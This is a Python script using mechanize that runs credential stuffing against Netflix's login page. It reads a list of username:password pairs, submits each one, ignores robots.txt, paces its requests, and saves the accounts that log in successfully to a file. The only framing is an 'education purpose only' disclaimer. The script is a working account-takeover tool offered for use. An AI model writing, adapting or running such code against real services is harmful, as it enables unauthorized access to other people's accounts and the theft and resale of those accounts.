import mechanize
import time

warnrs = 'NOTICE: I (ROHIT SAXENA) created this code for EDUCATION PURPOSE ONLY. Any illegal or intentional harm or ' \
         'misuse of this code is strictly prohibited by the owner (Rohit Saxena GitHub ID: rohit290554) of this code. ' \
         'For any illegal or intentional harm or misuse of this code, the Owner of this code (Rohit Saxena GitHub ID: ' \
         'rohit290554) will not be responsible. ' + '\n'
print(warnrs)
time.sleep(2)
# Setting-up variables.

temprs = 0
hexrs = 0
url = 'https://www.netflix.com/in/login'  # change login url as per need
url_login_success = 'https://www.netflix.com/browse'  # this url must be a page right after successful login
url_logout = 'https://www.netflix.com/in/logout'  # this must be a logout link
alive_account_list_temprs = []
alive_account_list_save_file = open('Working_Account.txt', 'w')
rs = mechanize.Browser()
rs.set_handle_equiv(True)
rs.set_handle_redirect(True)
rs.set_handle_referer(True)
rs.set_handle_robots(False)
rs.addheaders = [('User-agent', 'Firefox')]


def checkrs_response():
    if response.geturl() == url:
        print('Fail --> Wrong Username/Password provided !!')
        print(response.geturl())
    elif response.geturl() == url_login_success:
        print('Pass --> Username/Password Worked !!')


try:
    with open("idpw.txt",
              "r") as filestream:  # idpw.txt file should present with format username:password in order to work
        for line in filestream:
            rs.open(url)  # url must be direct login link of any active site
            time.sleep(15)
            currentline = line.split(':')  # if separator is different from ':' in idpw file replace here
            # print('currentline : ', currentline)
            rs.select_form(nr=0)
            rs.form['userLoginId'] = currentline[0]
            rs.form['password'] = currentline[1]
            print('logging in... Please Wait : ' + rs.form['userLoginId'] + ' and ' + rs.form['password'])
            response = rs.submit()
            time.sleep(10)
            checkrs_response()
            if response.geturl() == url_login_success:
                temprs = temprs + 1
                rs.open(url_logout)
                alive_account_list_temprs.append(currentline[0] + ':' + currentline[1])
                time.sleep(2)
            else:
                hexrs = hexrs + 1
                time.sleep(2)
                # Comment down below section if working_account_list.txt not required
    alive_account_list_save_file.write(warnrs + '\n')
    for alive_accounts in alive_account_list_temprs:
        print('alive_accounts : ' + alive_accounts)
        alive_account_list_save_file.write(str(alive_accounts) + '\n')
        # END of Writing IN FILE
except Exception:
    print('Something bad happened .. Saving progress .. '+Exception)
    for alive_accounts in alive_account_list_temprs:
        alive_account_list_save_file.write(str(alive_accounts) + '\n' + Exception)
print('\n' + 'Summery: ')
print('Total Active Account: ' + str(temprs))
print('Total Fail Account: ' + str(hexrs))
print('All working account saved in Working_Account.txt file')
